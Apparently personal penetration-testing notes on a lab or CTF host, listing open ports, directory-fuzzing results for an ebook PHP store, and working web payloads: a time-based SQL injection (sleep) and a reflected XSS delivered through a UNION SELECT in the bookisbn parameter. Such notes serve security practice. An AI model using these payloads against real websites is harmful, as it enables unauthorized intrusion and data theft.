puertos: 21,22,80,7080,8088,8715

# 80

- Apache httpd 2.4.38 Debian
#### Fuzz
```root.fuzz
/index.html          [32m (Status: 200)[0m [Size: 655]
/ebook               [36m (Status: 301)[0m [Size: 300][34m [--> http://cou.fi/ebook/][0m
/index.html          [32m (Status: 200)[0m [Size: 655]
```

```ebook.fuzz
/contact.php         [32m (Status: 200)[0m [Size: 4155]
/admin.php           [32m (Status: 200)[0m [Size: 3153]
/checkout.php        [32m (Status: 200)[0m [Size: 2696]
/database            [36m (Status: 301)[0m [Size: 309][34m [--> http://cou.fi/ebook/database/][0m
/template            [36m (Status: 301)[0m [Size: 309][34m [--> http://cou.fi/ebook/template/][0m
/cart.php            [32m (Status: 200)[0m [Size: 2702]
/info.php            [32m (Status: 200)[0m [Size: 94884]
/index.php           [32m (Status: 200)[0m [Size: 3998]
/book.php            [32m (Status: 200)[0m [Size: 10]
/functions           [36m (Status: 301)[0m [Size: 310][34m [--> http://cou.fi/ebook/functions/][0m
/edit.php            [32m (Status: 200)[0m [Size: 16]
/books.php           [32m (Status: 200)[0m [Size: 5164]
/models              [36m (Status: 301)[0m [Size: 307][34m [--> http://cou.fi/ebook/models/][0m
/controllers         [36m (Status: 301)[0m [Size: 312][34m [--> http://cou.fi/ebook/controllers/][0m
/process.php         [32m (Status: 200)[0m [Size: 2016]
/purchase.php        [32m (Status: 200)[0m [Size: 2692]
/verify.php          [32m (Status: 200)[0m [Size: 69]
/.gitattributes      [32m (Status: 200)[0m [Size: 66]
/admin.php           [32m (Status: 200)[0m [Size: 3153]
/index.php           [32m (Status: 200)[0m [Size: 3998]
/info.php            [32m (Status: 200)[0m [Size: 94885]
/.                   [32m (Status: 200)[0m [Size: 3998]
/bootstrap           [36m (Status: 301)[0m [Size: 310][34m [--> http://cou.fi/ebook/bootstrap/][0m
/admin_edit.php      [36m (Status: 302)[0m [Size: 1927][34m [--> index.php][0m
/README.md           [32m (Status: 200)[0m [Size: 116]
/admin_add.php       [36m (Status: 302)[0m [Size: 3519][34m [--> index.php][0m

```

#### Sql injection

Can't save files from sqli.

```sqli
http://cou.fi/ebook/bookPerPub.php?pubid=1
http://cou.fi/ebook/book.php?bookisbn=978-1-484217-26-9'+or+sleep(10);--+-
```

#### XSS Reflected
```xss
http://cou.fi/ebook/book.php?bookisbn=978-1-484217-26-9'+union+select+1,2,3,4,5,6,"><script>alert(1)</script>"+order+by+7--+-
```